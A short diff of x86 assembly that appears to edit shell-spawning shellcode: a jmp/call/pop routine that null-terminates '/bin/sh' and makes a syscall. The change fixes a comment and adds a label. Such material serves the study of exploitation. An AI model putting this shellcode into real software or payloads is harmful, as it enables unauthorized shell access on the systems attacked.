@@ -40,5 +40,6 @@ back:
 	movb	%dl, 0x7(EBX)	# null-terminator
 	_SYSCALL_		# syscall
 binsh:
-	call back		# pushl next_instr; jmp back
+	call back		# push next_instr; jmp back
+next_instr:
 	.ascii "/bin/sh"	# <-- next_instr
